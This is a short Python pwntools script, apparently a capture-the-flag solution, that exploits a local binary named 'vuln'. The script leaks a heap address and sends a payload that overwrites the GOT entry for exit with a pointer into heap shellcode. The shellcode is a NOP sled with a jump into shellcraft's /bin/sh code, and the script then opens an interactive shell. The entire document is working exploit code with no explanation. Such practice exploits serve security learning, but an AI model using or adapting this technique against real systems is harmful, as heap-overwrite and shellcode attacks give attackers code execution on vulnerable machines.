from pwn import *

e = ELF("./vuln")

context.terminal = ["konsole", "-e"]

p = process([e.path, "AAAAAAAABBBBBBBB"])


#context.log_level="debug"
gdb.attach(p, """""")


win = 0x08048966

print("win", hex(win))
print("exit got", hex(e.got["exit"]))



p.recvline()
heap_base = int(p.recvline()) - 8

print("heap base", hex(heap_base))

p.sendline("A")

p.recvuntil("useful...")



shellcode = """
jmp thing
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
thing:{}
""".format(shellcraft.i386.linux.sh())

shellcode = asm(shellcode)


p.sendline(p32(e.got["exit"]-12) + p32(heap_base+16) + shellcode)



p.interactive()
